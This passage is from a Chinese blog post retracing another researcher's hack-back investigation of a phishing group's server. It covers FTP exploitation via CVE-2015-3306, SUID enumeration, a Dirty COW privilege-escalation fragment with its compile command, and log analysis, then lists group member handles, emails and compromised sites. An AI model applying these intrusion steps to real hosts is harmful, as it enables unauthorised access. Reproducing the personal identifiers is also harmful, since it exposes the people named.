的技巧 <a href="https://github.com/K0rz3n/GoogleHacking-Page">传送门</a></strong>)</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B63.png" alt="此处输入图片的描述"></p><p>我们也能看到底部的署名 $ Muslim Cyber Corp - Mujahidin Cyber Army - Family Attack Cyber</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B64.png" alt="此处输入图片的描述"></p><p>里面的成员大致有这些吧(这个图蛮漂亮的~小声bb)</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B65.png" alt="此处输入图片的描述"></p><p>原作者对攻击者曾经入侵过的网站依然采用的是直接使用已知 shell config.php 利用 root 密码登录以后获取 web 日志和目录并打包到 www 目录下直接下载的方式进行信息收集。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B67.png" alt="此处输入图片的描述"></p><h2 id="0X04-傀儡机突破"><a href="#0X04-傀儡机突破" class="headerlink" title="0X04 傀儡机突破"></a><strong>0X04 傀儡机突破</strong></h2><h3 id="1-低版本PROFTPD-未授权文件复制getshell"><a href="#1-低版本PROFTPD-未授权文件复制getshell" class="headerlink" title="(1)低版本PROFTPD 未授权文件复制getshell"></a><strong>(1)低版本PROFTPD 未授权文件复制getshell</strong></h3><p>上面已经发现了攻击者常用的用来进行攻击的服务器 ip ，那我们自然不能放过这台服务器，开始新一轮的渗透。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>[+] HOST: 187.85.xxx.4巴西 <br>[+] OS: Ubuntu <br>[+] Web Server: Apache/2.2.22 / PHP/5.3.10-1ubuntu3.19 <br>[+] CMS: 未知<br></code></pre></td></tr></table></figure><p>nmap 使用绕过防火墙的参数，这里其实对我来说要学习的是增加对 nmap 各种参数的灵活使用程度</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap --script=firewalk --traceroute 187.85.xxx.4<br><br></code></pre></td></tr></table></figure><p>然后原作者后面的漏洞利用也是让我大开眼界，在端口扫描以后发现 21 端口开放</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>Starting Nmap 7.60 ( https://nmap.org ) at 2019-02-17 07:49 UTC<br>Nmap scan report <span class="hljs-keyword">for</span> 187.85.xxx.4<br>Host is up (0.14s latency).<br>Not shown: 996 filtered ports<br>PORT   STATE SERVICE<br>21/tcp open  ftp<br>22/tcp open  ssh<br>53/tcp open  domain<br>80/tcp open  http<br><br></code></pre></td></tr></table></figure><p>直接想到使用 nc 链接 21 端口判断 ftp 的版本，找到一个 proftpd 的低版本未授权复制漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>root@K0rz3n:~# nc 187.85.xxx.4 21<br>220 ProFTPD 1.3.4a Server (Debian) [::ffff:187.85.xxx.4]<br><br></code></pre></td></tr></table></figure><p>我肯定是没有这种思路的，我充其量的想法就是直接利用原始的大马反弹一个 shell 回来，<strong>不过这里也给我一些启示，渗透过程中要多多关注服务器使用的各种服务版本，任何低版本服务的漏洞都是整个服务器的突破口。</strong></p><blockquote><p>端口扫描发现目标 FTP Server为ProFTPd 1.3.4a这个版本和1.3.5存在未授权文件复制漏洞我们可以通过这个漏洞往Web目录写入一个WebShell。</p><p>ProFTPd 1.3.5 Remote Command ExecutionCVE-2015-3306<br>ProFTPD中使用的mod_copy模块存在未授权访问风险导致ProFTPD自带的命令 SITE CPFR 和 SITE CPTO可在未登录ftp的情况被外部黑客所利用对系统文件进行任意复制。</p></blockquote><p><strong>还有一点值得学习的就是原作者在寻找 exp 的时候使用了 kail 自带的 searchspolit 这个工具，</strong> 我原来也没怎么注意到，查了一下发现是和 exp-db 结合的离线 exp 库，很好用，这有一篇文章可以参考一下 <a href="https://xz.aliyun.com/t/2860">传送门</a>，<strong>还有就是强烈建议大家在自己的 vps 上安装好 kali 或者是一些常用工具如：msf ，这将是我们能正常渗透的保障。</strong></p><h3 id="2-拿到服务器全面围剿"><a href="#2-拿到服务器全面围剿" class="headerlink" title="(2)拿到服务器全面围剿"></a><strong>(2)拿到服务器全面围剿</strong></h3><p>在拿到了攻击者常用的傀儡服务器以后，原作者发现了大量的钓鱼脚本、挖矿后门和 DDOS 脚本，这些对于我们分析攻击者的行为是非常重要的，这也可以看出攻击者在这方面是比较专业的和系统的。</p><p><strong>僵尸网络程序</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B68.png" alt="此处输入图片的描述"></p><p><strong>DDOS 脚本</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B69.png" alt="此处输入图片的描述"></p><p><strong>钓鱼邮件模板</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B610.png" alt="此处输入图片的描述"></p><p><strong>万条邮箱信息</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B611.png" alt="此处输入图片的描述"></p><h3 id="3-杀器提权一击致命"><a href="#3-杀器提权一击致命" class="headerlink" title="(3)杀器提权一击致命"></a><strong>(3)杀器提权一击致命</strong></h3><h4 id="1-为什么要提权"><a href="#1-为什么要提权" class="headerlink" title="1.为什么要提权"></a><strong>1.为什么要提权</strong></h4><p>为什么要提权，因为我们的目的还是想获取 apache 的日志，目前我们的 shell 是没有访问 apache 日志的权限的</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B612.png" alt="此处输入图片的描述"></p><p>就算是我们可以打包整个网站，我们最终获取的还是我们有权限打包的目录，其他的一概不能打包成功 </p><p>那么，我们在默认权限下能打包到哪些文件呢？可能有些同学还不是很清楚，对 shell 权限的还是有误解，我其实之前也写过一个关于 shell 权限的探究问题，有兴趣得同学可以在我博客往前翻翻，这里我就再简单说一下：</p><p><strong>每个文件都有针对三个所属组的权限分配，我们的 php 的 shell 是 www-data 权限，这个用户是属于其他用户组的，也就是说在使用 ls -la 查看权限的时候看最后的三个字母的，我们在最后的三个字母里面主要有读权限(也就是最少有一个 r ),我们的 shell 才能将这个文件下载，如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B613.png" alt="此处输入图片的描述"></p><p>在上面这幅图中，我们能下载的文件只有</p><pre><code class="hljs">alternatives.logalternatives.log.1alternatives.log.2.gzapt                  -------------&gt;这是个目录，还要看目录里面的文件的权限bot.log</code></pre><h4 id="2-常见的-linux-提权方式"><a href="#2-常见的-linux-提权方式" class="headerlink" title="2.常见的 linux 提权方式"></a><strong>2.常见的 linux 提权方式</strong></h4><p><strong>Linux 提权有很多方式，常见的检测步骤如下</strong></p><pre><code class="hljs">1.检测操作系统的发行版本2.查看内核版本3.检测当前用户权限4.列举Suid文件5.查看已经安装的包，程序，运行的服务，过期版本的有可能有漏洞</code></pre><p>这里面其实涉及到几种 Linux 的提权思路，</p><h5 id="1-内核-exp-提权"><a href="#1-内核-exp-提权" class="headerlink" title="(1)内核 exp 提权"></a><strong>(1)内核 exp 提权</strong></h5><p>最简单直接的就是使用内核 exp 进行提权的方式，但是使用这种方式提权会有使目标系统崩溃的风险，</p><h5 id="2-suid提权"><a href="#2-suid提权" class="headerlink" title="(2)suid提权"></a><strong>(2)suid提权</strong></h5><p><strong>SUID是Linux的一种权限机制，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。如果拥有SUID权限，那么就可以利用系统中的二进制文件和工具来进行root提权</strong>。我们要在系统中找到有suid位的程序，寻找方法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>    find / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/null<br>    find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>    find / -user root -perm -4000 -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -ldb &#123;&#125; \; <br>```    <br><br>已知的可以使用 suid 进行特权提升的程序有：<br><br>    Ø Nmap<br>    <br>    Ø Vim<br>    <br>    Ø find<br>    <br>    Ø Bash<br>    <br>    Ø More<br>    <br>    Ø Less<br>    <br>    Ø Nano<br>    <br>    Ø <span class="hljs-built_in">cp</span><br>    <br><br>![此处输入图片的描述][18]<br><br>上面的所有二进制文件都可以在root权限下运行，因为他们的owner是root，并且他们的权限中含有s。s权限使一般使用者临时具有该文件所属主/组的执行权限。<br><br>但是由于这里的程序似乎没有能利用的，于是这一条路在这里就走不通了，如果想看具体的演示案例，可以看[这篇文章][19]<br><br><span class="hljs-comment">##### **(3)劫持环境变量提权**</span><br><br>这个思路大概就是，如果存在一个程序运行过程中会调用一个系统程序，那么我们可以把程序当前目录加入到系统的环境变量中，并且在程序目录中伪造那个系统程序为执行 /bin/sh，那么当再次运行那个程序的时候就能调用我们自己 构造的假的系统程序从而提权，具体的操作可以看 [这篇文章][20] <br><br><br>分析了一圈，发现这台服务器还是要用第一种简单直接的方式提权，本机的操作系统发行版本以及内核信息如下(**i386 说明是32位系统，如果是 x86_64 是64位系统**)<br><br>![此处输入图片的描述][21]<br><br>&gt; 当然查看系统发行版本除了使用上图的方式以外还可以使用 lsb_release -a<br>&gt; <br>&gt; ![此处输入图片的描述][22]<br><br><br>**原作者这里使用的是脏牛(CVE-2016-5195脏牛 理论上通杀 2.6.22 &lt; 3.9 (x86/x64)的内核版本。)进行提权，并且原文中提到了一点，作者是先在本地环境中进行了测试的，因为我们之前也说过，内核提权稍有不慎就会引起服务器崩溃，所以说原作者这样做是很值得我们学习的**<br><br>使用dirtycow-mem.c提权时需要注意i386架构下编译前需要将源代码中libc路径修改为目标系统libc路径否则执行时找不到文件，exp 来源于 [github][23] 。<br><br>```C<br>    <span class="hljs-comment">#define SHELLCODE &quot;\x31\xc0\xc3&quot;</span><br>    <span class="hljs-comment">#define SPACE_SIZE 256</span><br>    <span class="hljs-comment">#define LIBC_PATH &quot;/lib/x86_64-linux-gnu/libc.so.6&quot; ## 改为　/lib/i386-linux-gnu/libc.so.6</span><br>    <span class="hljs-comment">#define LOOP 0x1000000</span><br>    <span class="hljs-comment">#ifndef PAGE_SIZE</span><br>    <span class="hljs-comment">#define PAGE_SIZE 4096</span><br>    ...<br></code></pre></td></tr></table></figure><p>因为我发现目标系统没有安装 gcc ，所以我必须启动一个 i386 的ubuntu docker 进行编译(如果在 64为机器上编译，exp 将无法在 i386 目标机器上运行)，然后将编译好的 exp 进行上传</p><p><strong>编译</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@a6fb4b362251:/tmp# gcc -Wall -o hello dirtycow-mem.c -ldl -lpthread<br><br></code></pre></td></tr></table></figure><p><strong>运行</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B617.png" alt="此处输入图片的描述"></p><p>现在就能顺理成章地访问我们亲爱的 apache2 文件夹了</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B618.png" alt="此处输入图片的描述"></p><p>这样我们就能分析到 apache 日志了</p><h3 id="4-日志分析揭开面纱"><a href="#4-日志分析揭开面纱" class="headerlink" title="(4)日志分析揭开面纱"></a><strong>(4)日志分析揭开面纱</strong></h3><p>分析IP访问情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>root@kali /tmp/ grep <span class="hljs-string">&quot;/cacat/&quot;</span> * |grep <span class="hljs-string">&quot;php&quot;</span> | awk -F <span class="hljs-string">&quot;:&quot;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span> |awk <span class="hljs-string">&#x27;&#123;a[$1]+=1;&#125; END &#123;for(i in a)&#123;print a[i]&quot; &quot;i;&#125;&#125;&#x27;</span> |<span class="hljs-built_in">sort</span> -t <span class="hljs-string">&quot; &quot;</span> -k 1 -n -r &gt;ip.txt<br>95 185.56.xxx.138<br>77 197.211.xxx.52<br>70 67.71.xxx.8<br>59 207.35.xxx.35<br>41 99.226.xxx.46<br>41 193.215.xxx.238<br>39 197.211.xxx.163<br>38 82.61.xxx.132<br>38 66.249.xxx.95<br>37 76.26.xxx.181<br>37 197.234.xxx.77<br>31 105.112.xxx.60<br>29 105.112.xxx.41<br>20 109.166.xxx.68<br>16 66.249.xxx.61<br>16 197.211.xxx.18<br>14 212.100.xxx.191<br>12 197.234.xxx.210<br>8 66.249.xxx.35<br>8 66.249.xxx.64<br>7 154.118.xxx.165<br>5 66.249.xxx.67<br>......<br><br>root@kali /tmp <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> $(&lt;ip.txt); <span class="hljs-keyword">do</span> curl https://ip.cn/\?ip\=<span class="hljs-variable">$line</span> ; <span class="hljs-keyword">done</span><br>IP: 185.56.xxx.138 来自: 荷兰<br>IP: 197.211.xxx.52 来自: 尼日利亚<br>IP: 67.71.xxx.8 来自: 加拿大<br>IP: 207.35.xxx.35 来自: 加拿大<br>IP: 99.226.xxx.46 来自: 加拿大<br>IP: 193.215.xxx.238 来自: 挪威<br>IP: 197.211.xxx.163 来自: 尼日利亚<br>IP: 82.61.xxx.132 来自: 意大利<br>IP: 66.249.xxx.95 来自: Google 骨干网<br>IP: 76.26.xxx.181 来自: 美国<br>IP: 197.234.xxx.77 来自: 贝宁<br>IP: 105.112.xxx.60 来自: 尼日利亚<br>IP: 105.112.xxx.41 来自: 尼日利亚<br>IP: 109.166.xxx.68 来自: 罗马尼亚<br>IP: 66.249.xx.61 来自: Google 骨干网<br>IP: 197.211.xxx.18 来自: 尼日利亚<br>IP: 212.100.xxx.191 来自: 尼日利亚<br>IP: 197.234.xxx.210 来自: 贝宁<br>IP: 66.249.xxx.35 来自: Google 骨干网<br>IP: 66.249.xxx.64 来自: Google 骨干网<br>IP: 154.118.xxx.165 来自: 尼日利亚<br>IP: 66.249.xxx.67 来自: Google 骨干网<br>......<br></code></pre></td></tr></table></figure><p>根据路径名判断疑似受害者访问了钓鱼页面。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@kali /tmp/ grep <span class="hljs-string">&quot;/cacat&quot;</span> *| grep <span class="hljs-string">&quot;php&quot;</span> |grep <span class="hljs-string">&quot;POST&quot;</span> |awk -F <span class="hljs-string">&quot;:&quot;</span> <span class="hljs-string">&#x27;&#123;print $2 $6&#125;&#x27;</span> |<span class="hljs-built_in">sort</span> |<span class="hljs-built_in">uniq</span><br>109.166.xxx.68 - - [31/Jan/2018//187.85.xxx.4/cacat/portal/portal/userlogin.php<span class="hljs-string">&quot; &quot;</span>Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36<span class="hljs-string">&quot;</span><br><span class="hljs-string">109.166.xxx.68 - - [31/Jan/2018//187.85.xxx.4/cacat/portal/portal/userlogin.php?sfm_sid=120&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36&quot;</span><br>185.56.xxx.138 - - [31/Jan/2018//187.85.xxx.4/cacat/portal/portal/userlogin.php?sfm_sid=8425<span class="hljs-string">&quot; &quot;</span>Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36<span class="hljs-string">&quot;</span><br><span class="hljs-string">196.52.xxx.20 - - [12/Oct/201835.0) Gecko/20100101 Firefox/35.0&quot;</span><br>207.35.xxx.35 - - [21/Aug/2018//187.85.xxx.4/cacat/win2018/winbnk/EBlogin.html?sitecode=GR&amp;lang=el-GR<span class="hljs-string">&quot; &quot;</span>Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36<span class="hljs-string">&quot;</span><br><span class="hljs-string">197.211.xxx.52 - - [07/Sep/2018:16:02:40 -0300] &quot;</span>GET /cacat/nnnnn.zip HTTP/1.1<span class="hljs-string">&quot; 200 4489167 &quot;</span>http://187.85.xxx.4/cacat/<span class="hljs-string">&quot; &quot;</span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36<span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>查看web目录下txt文件访问情况总共有一万多IP。访问地址包含受害者主机IP、各种搜索引擎爬虫IP、各路黑客的IP等等。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep <span class="hljs-string">&quot;/cacat/&quot;</span> * |grep <span class="hljs-string">&quot;txt&quot;</span> | awk -F <span class="hljs-string">&quot;:&quot;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span> |awk <span class="hljs-string">&#x27;&#123;a[$1]+=1;&#125; END &#123;for(i in a)&#123;print a[i]&quot; &quot;i;&#125;&#125;&#x27;</span> |<span class="hljs-built_in">sort</span> -t <span class="hljs-string">&quot; &quot;</span> -k 1 -n -r &gt;ip.txt<br><br>root@kali ~/Desktop <span class="hljs-built_in">wc</span> -l ip.txt<br>10101 ip.txt<br><br></code></pre></td></tr></table></figure><h2 id="0X05-热力图分析"><a href="#0X05-热力图分析" class="headerlink" title="0X05 热力图分析"></a><strong>0X05 热力图分析</strong></h2><p>将获得的IP转换成经纬度坐标再通过百度地图API生成热力图</p><pre><code class="hljs">将IP转换成经纬度坐标脚本ip2xy.py 生成经纬度坐标文件point.js 全球IP库GeoLiteCity.dat</code></pre><p>这个我也是没想到的一步，通过热力图能将我们之前收集到的 ip 地址在全球的分布很直观的表现出来，可以说原作者在这方面的经验还是十分的丰富</p><h2 id="0X06-信息汇总"><a href="#0X06-信息汇总" class="headerlink" title="0X06 信息汇总"></a><strong>0X06 信息汇总</strong></h2><p>根据所得信息汇总对这个黑客组织信息进行简单分析仅供参考。</p><h3 id="1-组织信息"><a href="#1-组织信息" class="headerlink" title="(1)组织信息"></a><strong>(1)组织信息</strong></h3><p>名称</p><pre><code class="hljs">Muslim Cyber Corp – Mujahidin Cyber Army – Family Attack Cyber</code></pre><p>地区</p><pre><code class="hljs">巴勒斯坦</code></pre><p>成员ID</p><pre><code class="hljs">Hawk_B404 、 MR.S1NS_Y 、 koneksi eror 、 GU3LT03M 、 SinonX 、 ./B4Z1R007 、 ./Bl4ckJ4ck 、 anon99husein 、 4GottenName 、Gantai 、 4nzeL4 、 AKEMI403</code></pre><p>历史邮箱</p><pre><code class="hljs">alexsin54@yahoo.com jasonchowan223@gmail.com macacperus@yopmail.com bidibidibidi@yopmail.com bidi.pici11@hotmail.com bidi.cuc@mail.com flrnvasilica@gmail.com</code></pre><p>组织主页</p><pre><code class="hljs">http://mujahidincyberarmy.blogspot.com/ https://www.facebook.com/FamilyAttackCyberOfficial/</code></pre><h3 id="2-攻击手段"><a href="#2-攻击手段" class="headerlink" title="(2)攻击手段"></a><strong>(2)攻击手段</strong></h3><pre><code class="hljs">入侵使用Wordpress、Joomla! CMS的网站、放置钓鱼程序批量传播钓鱼邮件。</code></pre><p>攻击目标</p><pre><code class="hljs">早期政治目的居多主要攻击美国政府机构网站和雇员。近期多为商业目的主要针对欧洲银行客户以及亚洲金融机构雇员进行邮件钓鱼。</code></pre><p>控制主机</p><pre><code class="hljs">187.85.xxx.4</code></pre><p>常用后门</p><pre><code class="hljs">略</code></pre><h3 id="3-攻击历史"><a href="#3-攻击历史" class="headerlink" title="(3)攻击历史"></a><strong>(3)攻击历史</strong></h3><p>美国联邦调查局、美国国土安全部、美国司法部</p><pre><code class="hljs">巴勒斯坦黑客已经发布了大约2万名联邦调查局FBI和9,000名国土安全部DHS官员的个人信息 http://mujahidincyberarmy.blogspot.com/2016/12/inilah-data-informasi-pribadi-20-ribu.html通过钓鱼邮件获得美国司法部权限 http://mujahidincyberarmy.blogspot.com/2016/02/hacker-pro-palestina-terbitkan.html</code></pre><h3 id="4-代理IP"><a href="#4-代理IP" class="headerlink" title="(4)代理IP"></a><strong>(4)代理IP</strong></h3><pre><code class="hljs">174.85.145.99 (美国) - - [27/Nov/2018:23:35:31 +0300] &quot;POST /shells/bacu.php HTTP/1.1&quot; 200 4731 &quot;http://www.rosturxxxx.com/shells/bacu.php&quot; &quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36&quot;50.73.252.169 (美国) - - [29/Nov/2018//www.rosturxxxx.com/shells/config.php&quot; &quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36&quot;213.233.104.120 (罗马尼亚) - - [27/Nov/2018:22:10:03 +0300] &quot;GET /shells/config.php HTTP/1.1&quot; 200 124 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;207.228.149.69 (百慕大 ) - - [28/Nov/2018:23:12:54 +0300] &quot;POST /shells/config.php HTTP/1.1&quot; 200 3729 &quot;http://www.rosturxxxx.com/shells/config.php&quot; &quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36&quot;195.211.23.207 (俄罗斯) - - [27/Nov/2018:22:36:50 +0300] &quot;GET /shells/config.php HTTP/1.1&quot; 200 124 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36&quot;29.205.113.8 (尼日利亚) - - [30/Nov/2018//www.rosturxxxx.com/shells/config.php&quot; &quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&quot;212.1.211.3 美国 - - [30/Nov/2018:13:35:36 -0300] &quot;GET /online/templates/beez5/bc.php HTTP/1.1&quot; 200 16823 &quot;-&quot; &quot;Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)&quot;178.128.221.199 希腊- - [29/Nov/2018//www.zebramedia.al/wp-content/themes/shells/INSTALL.sql.txt.php&quot; &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&quot;197.211.61.82 尼日利亚) - - [29/Nov/2018//www.zebramedia.al/wp-content/themes/shells/INSTALL.sql.txt.php&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36&quot;</code></pre><h3 id="5-被黑网站"><a href="#5-被黑网站" class="headerlink" title="(5)被黑网站"></a><strong>(5)被黑网站</strong></h3><pre><code class="hljs">不完全统计rosturxxxx.commirohxxxxx.skhelioncomposites.comradiolanalhue.clzebramedia.alwww.qtfontebispo.comwww.seoeaze.comvilapoucadeaguiar.comproyectosphr.clu-p.comwww.humanaconsultores.clamsogroup.comwww.tdftechnologies.comwww.bvvagos.ptwww.huellasdigitales.cllince.apsl.edu.plwww.fica.unsl.edu.arproyectosphr.clwww.zlobek.uw.edu.plifr.ptmail.ijrer.orgwww.hkmms.org.hkhistoria.apsl.edu.plwww.homeguide.com.sgonlinecombos.co.inumo.apsl.edu.plwww.bpmp2t.lombokbaratkab.go.idamsogroup.comviper.clwww.teniscavancha.clwww.estacaomedica.ptterrarestobar.cljf-bragado.pthelioncomposites.comnotariabasualto.clericdiblasi.comreinamarltda.clcobraz.ptwww.stmarypellaia.comwebcam.wm-itservice.at</code></pre><h2 id="0X07-攻击路径还原"><a href="#0X07-攻击路径还原" class="headerlink" title="0X07 攻击路径还原"></a><strong>0X07 攻击路径还原</strong></h2><p>这个图画的也非常的专业，使用的是 <a href="https://www.processon.com/">processon</a> 配合 <a href="https://www.iconfont.cn/">iconfont</a> 绘制而成的。</p><h2 id="0X08-总结"><a href="#0X08-总结" class="headerlink" title="0X08 总结"></a><strong>0X08 总结</strong></h2><p>本文主要是尽可能的根据原文的思路结合自己的实践回顾一下原作者对整个事件的分析流程，整个过程中涉及到很多渗透的技巧和社会工程学的知识，走了一遍以后还是大有收获，但也因为这样其中很多内容是复制于原文，就当是一次学习笔记吧，原作者是对钓鱼的回溯，我是对作者文章的回溯，仅此而已，毕竟，少就是多，慢就是快。</p><h2 id="0X09-参考"><a href="#0X09-参考" class="headerlink" title="0X09 参考"></a><strong>0X09 参考</strong></h2><p><a href="https://www.freebuf.com/vuls/195090.html">https://www.freebuf.com/vuls/195090.html</a><br><a href="https://www.altn.com.cn/2153.html">https://www.altn.com.cn/2153.html</a><br><a href="https://www.webshell.cc/5211.html">https://www.webshell.cc/5211.html</a><br><a href="https://pentestlab.blog/2017/09/25/suid-executables/">https://pentestlab.blog/2017/09/25/suid-executables/</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>对一次 redis 未授权写入攻击的分析以及 redis 4.x RCE 学习</title>
    <link href="/2019/07/29/%E5%AF%B9%E4%B8%80%E6%AC%A1%20redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%99%E5%85%A5%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%20redis%204.x%20RCE%20%E5%AD%A6%E4%B9%A0/"/>
